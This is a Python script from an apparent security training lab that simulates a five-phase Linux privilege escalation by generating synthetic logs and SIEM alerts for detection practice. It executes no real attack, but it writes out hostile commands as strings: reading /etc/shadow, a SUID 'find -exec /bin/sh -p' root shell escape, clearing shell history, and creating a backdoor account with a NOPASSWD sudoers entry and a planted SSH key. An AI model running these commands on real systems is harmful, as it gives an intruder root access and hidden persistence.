#!/usr/bin/env python3
"""
Scenario 16: Privilege Escalation Attack Simulation.

Full attack chain:
  Phase 1 - Normal user SSH access
  Phase 2 - Unauthorized sudo attempts (denied)
  Phase 3 - Discover and exploit misconfigured SUID binary
  Phase 4 - Gain root access via SUID exploit
  Phase 5 - Create backdoor admin account for persistence

SAFETY: No actual privilege escalation is performed -- all activity is
simulated through realistic log generation.
"""

import json
import os
import random
import sys
import time
from datetime import datetime

from colorama import Fore, Style, init

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", ".."))

from wcace_lib.log_generator import LogGenerator
from wcace_lib.siem_client import SIEMClient
from wcace_lib.constants import (
    ATTACKER_IP, COMPANY_DOMAIN, REGULAR_USERS,
    WORKSTATION_IPS, ADMIN_USERS, MITRE,
)

init(autoreset=True)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

LOG_DIR = os.path.join(os.path.dirname(__file__), "..", "logs", "sample_logs")

ATTACKER_USER = "carlos.garcia"       # Compromised regular user
ATTACKER_WS = WORKSTATION_IPS[4]      # Attacker's workstation IP
BACKDOOR_USER = "svc_support"         # Backdoor admin account name
TARGET_HOST = "db-server-01"          # Target server

# SUID binaries commonly misconfigured in real attacks
SUID_BINARIES = [
    "/usr/bin/find",
    "/usr/bin/vim.basic",
    "/usr/bin/nmap",
    "/usr/bin/python3",
    "/usr/bin/env",
]

# Commands the attacker tries with sudo
SUDO_COMMANDS = [
    "/bin/bash",
    "/usr/bin/cat /etc/shadow",
    "/usr/sbin/useradd testuser",
    "/usr/bin/passwd root",
]


# ---------------------------------------------------------------------------
# Banner
# ---------------------------------------------------------------------------

def banner():
    print(f"""
{Fore.RED}+==============================================================+
|  WCACE Scenario 16: Privilege Escalation Simulation          |
|  Attack: User -> Sudo Abuse -> SUID Exploit -> Root          |
|  Target: {TARGET_HOST:<50s}|
|  WARNING: Educational use only                               |
+==============================================================+{Style.RESET_ALL}
""")


# ---------------------------------------------------------------------------
# Phase 1: Normal User Access
# ---------------------------------------------------------------------------

def phase_1_normal_access(log_gen: LogGenerator) -> list[str]:
    """Simulate normal user SSH login -- establishing initial foothold."""
    print(f"{Fore.YELLOW}[Phase 1] Normal User Access{Style.RESET_ALL}")
    print(f"  Attacker: {ATTACKER_USER}@{COMPANY_DOMAIN}")
    print(f"  Source IP: {ATTACKER_IP}")
    print(f"  Target: {TARGET_HOST}\n")

    logs = []

    # Successful SSH login as regular user
    logs.append(log_gen.auth_success(ATTACKER_USER, ATTACKER_IP))
    print(f"  [+] SSH login accepted for {ATTACKER_USER} from {ATTACKER_IP}")

    # Normal activity -- reading files, listing directories
    normal_commands = [
        "ls -la /home/" + ATTACKER_USER,
        "cat /etc/passwd",
        "uname -a",
        "id",
        "whoami",
        "ps aux",
        "netstat -tlnp",
    ]

    for cmd in normal_commands:
        logs.append(log_gen.json_log("command_execution", {
            "user": ATTACKER_USER,
            "src_ip": ATTACKER_IP,
            "command": cmd,
            "tty": "pts/0",
            "result": "success",
        }, severity="info"))

    print(f"  [+] Executed {len(normal_commands)} reconnaissance commands")
    print(f"  {Fore.CYAN}[*] Initial foothold established as regular user{Style.RESET_ALL}")

    return logs


# ---------------------------------------------------------------------------
# Phase 2: Unauthorized Sudo Attempts
# ---------------------------------------------------------------------------

def phase_2_sudo_attempts(log_gen: LogGenerator) -> list[str]:
    """Simulate failed sudo attempts -- user not in sudoers."""
    print(f"\n{Fore.YELLOW}[Phase 2] Unauthorized Sudo Attempts{Style.RESET_ALL}")
    logs = []

    for cmd in SUDO_COMMANDS:
        # Generate sudo failure log
        logs.append(log_gen.sudo_event(ATTACKER_USER, cmd, success=False))
        print(f"  {Fore.RED}[DENIED]{Style.RESET_ALL} sudo {cmd}")

        # Generate corresponding auth log entry
        logs.append(log_gen.syslog(
            f"pam_unix(sudo:auth): authentication failure; "
            f"logname={ATTACKER_USER} uid=1005 euid=0 tty=/dev/pts/0 "
            f"ruser={ATTACKER_USER} rhost=",
            severity="alert", facility="auth"
        ))

        time.sleep(0.1)

    # Security alert log for repeated sudo failures
    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100540,
        "rule_level": 10,
        "rule_description": "WCACE S16: Multiple unauthorized sudo attempts detected",
        "user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "attempts": len(SUDO_COMMANDS),
        "mitre": ["T1548"],
    }, severity="warning"))

    print(f"\n  {Fore.CYAN}[*] {len(SUDO_COMMANDS)} sudo attempts blocked -- "
          f"user not in sudoers{Style.RESET_ALL}")

    return logs


# ---------------------------------------------------------------------------
# Phase 3: SUID Binary Discovery and Exploitation
# ---------------------------------------------------------------------------

def phase_3_suid_exploit(log_gen: LogGenerator) -> list[str]:
    """Simulate finding and exploiting a misconfigured SUID binary."""
    print(f"\n{Fore.YELLOW}[Phase 3] SUID Binary Discovery & Exploitation{Style.RESET_ALL}")
    logs = []

    # Step 1: Search for SUID binaries
    suid_search_cmd = "find / -perm -4000 -type f 2>/dev/null"
    logs.append(log_gen.json_log("command_execution", {
        "user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "command": suid_search_cmd,
        "tty": "pts/0",
        "result": "success",
        "mitre_technique": MITRE["privilege_escalation"]["exploitation"],
    }, severity="warning"))
    print(f"  [+] Searching for SUID binaries: {suid_search_cmd}")

    # Show discovered SUID binaries
    print(f"  [+] Discovered SUID binaries:")
    for binary in SUID_BINARIES:
        print(f"      -rwsr-xr-x root root {binary}")

    # Log discovery of SUID binaries
    logs.append(log_gen.json_log("suid_discovery", {
        "user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "suid_binaries": SUID_BINARIES,
        "count": len(SUID_BINARIES),
        "mitre_technique": MITRE["privilege_escalation"]["exploitation"],
    }, severity="warning"))

    # Step 2: Exploit misconfigured /usr/bin/find (SUID)
    exploit_binary = "/usr/bin/find"
    exploit_cmd = f"{exploit_binary} . -exec /bin/sh -p \\; -quit"
    print(f"\n  {Fore.RED}[EXPLOIT]{Style.RESET_ALL} Targeting: {exploit_binary}")
    print(f"  {Fore.RED}[EXPLOIT]{Style.RESET_ALL} Command: {exploit_cmd}")

    logs.append(log_gen.json_log("suid_execution", {
        "user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "binary": exploit_binary,
        "command": exploit_cmd,
        "suid_owner": "root",
        "effective_uid": 0,
        "mitre_technique": MITRE["privilege_escalation"]["exploitation"],
    }, severity="critical"))

    # Audit log for the SUID execution
    logs.append(log_gen.syslog(
        f"AUDIT: type=EXECVE user={ATTACKER_USER} uid=1005 euid=0 "
        f"exe=\"{exploit_binary}\" "
        f"command=\"{exploit_cmd}\" "
        f"key=\"suid_execution\"",
        severity="alert", facility="local0"
    ))

    # IDS alert for SUID abuse
    logs.append(log_gen.ids_alert(
        ATTACKER_IP, ATTACKER_WS,
        "Privilege Escalation: SUID binary exploitation detected",
        sid=9160001, severity=1,
    ))

    # Wazuh alert for SUID exploitation
    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100542,
        "rule_level": 13,
        "rule_description": "WCACE S16: SUID binary exploited for privilege escalation",
        "user": ATTACKER_USER,
        "binary": exploit_binary,
        "src_ip": ATTACKER_IP,
        "mitre": ["T1068", "T1548"],
    }, severity="critical"))

    print(f"\n  {Fore.CYAN}[*] SUID exploit executed -- "
          f"effective UID changed to 0 (root){Style.RESET_ALL}")

    return logs


# ---------------------------------------------------------------------------
# Phase 4: Root Access
# ---------------------------------------------------------------------------

def phase_4_root_access(log_gen: LogGenerator) -> list[str]:
    """Simulate gaining root access after SUID exploitation."""
    print(f"\n{Fore.YELLOW}[Phase 4] Root Access Achieved{Style.RESET_ALL}")
    logs = []

    # Root shell obtained
    logs.append(log_gen.syslog(
        f"session opened for user root by {ATTACKER_USER}(uid=0)",
        severity="alert", facility="auth"
    ))
    print(f"  {Fore.RED}[ROOT]{Style.RESET_ALL} Root shell obtained via SUID exploitation")

    # Root-level commands executed
    root_commands = [
        ("id", "uid=0(root) gid=0(root) groups=0(root)"),
        ("cat /etc/shadow", "root:$6$hash...:19000:0:99999:7:::"),
        ("cat /root/.ssh/authorized_keys", "ssh-rsa AAAA... admin@server"),
        ("history -c", ""),
        ("cat /var/log/auth.log | tail -20", ""),
    ]

    for cmd, output in root_commands:
        logs.append(log_gen.json_log("command_execution", {
            "user": "root",
            "original_user": ATTACKER_USER,
            "src_ip": ATTACKER_IP,
            "command": cmd,
            "tty": "pts/0",
            "result": "success",
            "effective_uid": 0,
        }, severity="critical"))
        print(f"  [root@{TARGET_HOST}]# {cmd}")
        if output:
            print(f"    -> {output[:70]}")

    # Read sensitive files -- shadow file access
    logs.append(log_gen.file_access("root", "/etc/shadow", action="read"))
    logs.append(log_gen.file_access("root", "/root/.ssh/authorized_keys", action="read"))

    # Wazuh alert for root access from non-admin
    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100544,
        "rule_level": 14,
        "rule_description": "WCACE S16: Root access gained by non-admin user via privilege escalation",
        "user": ATTACKER_USER,
        "effective_user": "root",
        "src_ip": ATTACKER_IP,
        "escalation_method": "suid_exploitation",
        "mitre": ["T1068"],
    }, severity="critical"))

    print(f"\n  {Fore.CYAN}[*] Root access confirmed -- "
          f"sensitive files accessed{Style.RESET_ALL}")

    return logs


# ---------------------------------------------------------------------------
# Phase 5: Create Backdoor Admin Account
# ---------------------------------------------------------------------------

def phase_5_backdoor_account(log_gen: LogGenerator) -> list[str]:
    """Simulate creating a backdoor admin account for persistence."""
    print(f"\n{Fore.YELLOW}[Phase 5] Backdoor Admin Account Creation{Style.RESET_ALL}")
    logs = []

    # Create new user
    useradd_cmd = f"useradd -m -s /bin/bash -G sudo,adm {BACKDOOR_USER}"
    logs.append(log_gen.json_log("command_execution", {
        "user": "root",
        "original_user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "command": useradd_cmd,
        "result": "success",
        "effective_uid": 0,
    }, severity="critical"))
    print(f"  [root@{TARGET_HOST}]# {useradd_cmd}")

    # Auth log for user creation
    logs.append(log_gen.syslog(
        f"new user: name={BACKDOOR_USER}, UID=1099, GID=1099, "
        f"home=/home/{BACKDOOR_USER}, shell=/bin/bash",
        severity="notice", facility="auth"
    ))

    # Set password for backdoor user
    passwd_cmd = f"echo '{BACKDOOR_USER}:B4ckd00r!Pass' | chpasswd"
    logs.append(log_gen.json_log("command_execution", {
        "user": "root",
        "original_user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "command": f"chpasswd (set password for {BACKDOOR_USER})",
        "result": "success",
    }, severity="critical"))
    print(f"  [root@{TARGET_HOST}]# {passwd_cmd}")

    # Add to sudoers directly
    sudoers_cmd = f'echo "{BACKDOOR_USER} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers.d/{BACKDOOR_USER}'
    logs.append(log_gen.json_log("command_execution", {
        "user": "root",
        "original_user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "command": sudoers_cmd,
        "result": "success",
    }, severity="critical"))
    print(f"  [root@{TARGET_HOST}]# {sudoers_cmd}")

    # File modification log for /etc/sudoers.d/
    logs.append(log_gen.json_log("fim_alert", {
        "file_path": f"/etc/sudoers.d/{BACKDOOR_USER}",
        "action": "created",
        "user": "root",
        "alert_type": "syscheck",
    }, severity="critical"))

    # Add SSH key for persistence
    ssh_key_cmd = (
        f"mkdir -p /home/{BACKDOOR_USER}/.ssh && "
        f"echo 'ssh-rsa AAAA...attacker_key...' > "
        f"/home/{BACKDOOR_USER}/.ssh/authorized_keys"
    )
    logs.append(log_gen.json_log("command_execution", {
        "user": "root",
        "original_user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "command": f"Install SSH key for {BACKDOOR_USER}",
        "result": "success",
    }, severity="critical"))
    print(f"  [root@{TARGET_HOST}]# mkdir -p /home/{BACKDOOR_USER}/.ssh")
    print(f"  [root@{TARGET_HOST}]# echo 'ssh-rsa ...' > "
          f"/home/{BACKDOOR_USER}/.ssh/authorized_keys")

    # Test backdoor login
    logs.append(log_gen.auth_success(BACKDOOR_USER, ATTACKER_IP, method="publickey"))
    print(f"\n  {Fore.RED}[BACKDOOR]{Style.RESET_ALL} Testing backdoor login: "
          f"{BACKDOOR_USER}@{TARGET_HOST}")
    print(f"  {Fore.RED}[BACKDOOR]{Style.RESET_ALL} SSH login with public key: SUCCESS")

    # Verify sudo access
    logs.append(log_gen.sudo_event(BACKDOOR_USER, "/bin/bash", success=True))
    print(f"  {Fore.RED}[BACKDOOR]{Style.RESET_ALL} sudo /bin/bash: SUCCESS (NOPASSWD)")

    # Wazuh alerts for backdoor creation
    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100546,
        "rule_level": 14,
        "rule_description": "WCACE S16: New user account created with sudo privileges",
        "user": BACKDOOR_USER,
        "groups": ["sudo", "adm"],
        "created_by": "root",
        "original_user": ATTACKER_USER,
        "src_ip": ATTACKER_IP,
        "mitre": ["T1136.001"],
    }, severity="critical"))

    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100547,
        "rule_level": 15,
        "rule_description": "WCACE S16: Sudoers file modified - NOPASSWD entry added",
        "file_path": f"/etc/sudoers.d/{BACKDOOR_USER}",
        "entry": f"{BACKDOOR_USER} ALL=(ALL) NOPASSWD:ALL",
        "src_ip": ATTACKER_IP,
        "mitre": ["T1548"],
    }, severity="critical"))

    # Correlation alert: full privilege escalation kill chain
    logs.append(log_gen.json_log("wazuh_alert", {
        "rule_id": 100548,
        "rule_level": 15,
        "rule_description": "WCACE S16: Privilege escalation kill chain detected - user to root to backdoor",
        "src_ip": ATTACKER_IP,
        "original_user": ATTACKER_USER,
        "backdoor_user": BACKDOOR_USER,
        "kill_chain_phases": [
            "initial_access",
            "sudo_attempt_denied",
            "suid_exploitation",
            "root_access",
            "backdoor_account_created",
        ],
        "mitre": ["T1068", "T1548", "T1136.001"],
    }, severity="critical"))

    print(f"\n  {Fore.CYAN}[*] Backdoor account {BACKDOOR_USER} created with "
          f"full sudo access{Style.RESET_ALL}")

    return logs


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    banner()

    log_gen = LogGenerator(source_host=TARGET_HOST, facility="auth")
    all_logs = []

    # Phase 1: Normal user access
    logs_p1 = phase_1_normal_access(log_gen)
    all_logs.extend(logs_p1)
    time.sleep(0.5)

    # Phase 2: Unauthorized sudo attempts
    logs_p2 = phase_2_sudo_attempts(log_gen)
    all_logs.extend(logs_p2)
    time.sleep(0.5)

    # Phase 3: SUID binary exploitation
    logs_p3 = phase_3_suid_exploit(log_gen)
    all_logs.extend(logs_p3)
    time.sleep(0.5)

    # Phase 4: Root access
    logs_p4 = phase_4_root_access(log_gen)
    all_logs.extend(logs_p4)
    time.sleep(0.5)

    # Phase 5: Backdoor admin account
    logs_p5 = phase_5_backdoor_account(log_gen)
    all_logs.extend(logs_p5)

    # ---------------------------------------------------------------------------
    # Save logs
    # ---------------------------------------------------------------------------
    os.makedirs(LOG_DIR, exist_ok=True)

    # Save combined attack log
    log_file = os.path.join(LOG_DIR, "privilege_escalation_attack.jsonl")
    SIEMClient.write_logs_to_file(all_logs, log_file)

    # Save auth-only logs (syslog format entries)
    auth_logs = [l for l in all_logs if not l.startswith("{")]
    auth_file = os.path.join(LOG_DIR, "auth_logs.log")
    SIEMClient.write_logs_to_file(auth_logs, auth_file)

    # Save wazuh alerts separately
    wazuh_alerts = [l for l in all_logs if "wazuh_alert" in l]
    wazuh_file = os.path.join(LOG_DIR, "wazuh_alerts.jsonl")
    SIEMClient.write_logs_to_file(wazuh_alerts, wazuh_file)

    # ---------------------------------------------------------------------------
    # Summary
    # ---------------------------------------------------------------------------
    print(f"\n{Fore.GREEN}{'=' * 62}")
    print(f"  Attack Simulation Complete")
    print(f"{'=' * 62}{Style.RESET_ALL}")
    print(f"  Total log entries:      {len(all_logs)}")
    print(f"  Auth/syslog entries:    {len(auth_logs)}")
    print(f"  Wazuh alert entries:    {len(wazuh_alerts)}")
    print(f"  Attacker user:          {ATTACKER_USER}")
    print(f"  Backdoor user:          {BACKDOOR_USER}")
    print(f"  Target host:            {TARGET_HOST}")
    print(f"\n  Log files:")
    print(f"    {log_file}")
    print(f"    {auth_file}")
    print(f"    {wazuh_file}")

    # Try to push logs to Loki
    try:
        siem = SIEMClient()
        siem.loki_push_lines(
            {"job": "attack_sim", "scenario": "16-privilege-escalation"},
            all_logs,
        )
        print(f"\n  {Fore.GREEN}[*] Logs pushed to Loki{Style.RESET_ALL}")
    except Exception:
        print(f"\n  [*] Loki not available -- logs saved locally only")

    print(f"\n  Next: Run detect/verify_detection.py to verify alerts")
    print(f"        Run respond/containment.py for incident response\n")


if __name__ == "__main__":
    main()
